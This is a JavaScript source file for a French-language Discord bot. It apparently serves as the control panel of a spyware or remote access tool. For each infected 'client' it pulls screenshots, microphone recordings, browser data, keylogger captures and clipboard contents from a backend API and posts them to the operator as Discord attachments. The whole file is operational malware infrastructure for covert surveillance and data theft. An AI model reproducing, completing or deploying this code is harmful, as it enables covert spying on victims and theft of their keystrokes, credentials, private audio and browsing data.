import { ActionRowBuilder, StringSelectMenuBuilder, AttachmentBuilder } from 'discord.js';
import { createEmbed } from "./utils.js";
import { executeRequestWithTokenRefresh } from './token.js';
import config from '../static/config.json' assert {type: 'json'};
const { API_BASE_URL } = config;

export async function fetchDataAndUpdateInteraction(type, interaction, clientId, browser) {
    let endpoint = "";
    let contentType = "";
    switch (type) {
        case 'screenshot':
            endpoint = `screenshot/client/${clientId}`;
            contentType = "capture d'écran";
            break;
        case 'microphone':
            endpoint = `microphone/client/${clientId}`;
            contentType = "enregistrement audio";
            break;
        case 'browserdata':
            endpoint = `browser/client/${clientId}/${browser}`;
            contentType = "donnée de navigation";
            break;
        case 'keylogger':
            endpoint = `keylogger/client/${clientId}`;
            contentType = "enregistrement du clavier";
            break;
        case 'papier':
            endpoint = `papier/client/${clientId}`;
            contentType = "récuperation du presse papier";
            break;

    }

    const url = `${API_BASE_URL}/${endpoint}`;
    try {
        const response = await executeRequestWithTokenRefresh(url);
        const items = response.data;
        if (items.length === 0) {
            await interaction.update(`Aucun(e) ${contentType} disponible pour ce client.`);
            return;
        }

        const options = items.map(item => ({
            label: type === 'browserdata' ? item.file_path.split('/').pop() : `${contentType} ${item.id}`,
            description: `Le ${item.date_created}`,
            value: type === 'browserdata' ? `${item.id}_${item.file_path.split('/').pop()}` : item.id.toString(),
        }));

        const selectMenu = new StringSelectMenuBuilder()
            .setCustomId(`select_${type}`)
            .setPlaceholder(`Sélectionnez un(e) ${contentType}`)
            .addOptions(options.slice(0, 25)); // Discord limit of 25 options

        const row = new ActionRowBuilder().addComponents(selectMenu);

        await interaction.update({ content: `Sélectionnez un(e) ${contentType} :`, components: [row] });
    } catch (error) {
        console.error(`Erreur lors de la récupération des ${contentType}s`, error);
        await interaction.update({ content: `Erreur lors de la récupération des ${contentType}s.` });
    }
}

export async function handleFileResponse(interaction, endpoint, fileName, description, contentType) {
    await interaction.deferReply({ ephemeral: true });
    try {
        const response = await executeRequestWithTokenRefresh(endpoint, { method: 'GET', responseType: 'arraybuffer' });
        let buffer;
        if(contentType === 'text') {
            buffer = Buffer.from(response.data, 'utf-8');
        }else{
            buffer = Buffer.from(response.data, 'binary');
        }
        const attachment = new AttachmentBuilder(buffer, { name: fileName });

        let embed;
        if (contentType === 'image') {
            embed = createEmbed("Capture d'écran", "Voici la capture d'écran :", [], '#2f6d2d', "attachment://" + fileName);
        }

        await interaction.editReply({
            content: description,
            files: [attachment],
            embeds: embed ? [embed] : [],
            components: []
        });
    } catch (error) {
        console.error(`Erreur lors de la récupération du fichier ${contentType}`, error);
        await interaction.editReply({
            content: `Erreur lors de la récupération du fichier ${contentType}.`,
            components: []
        });
    }
}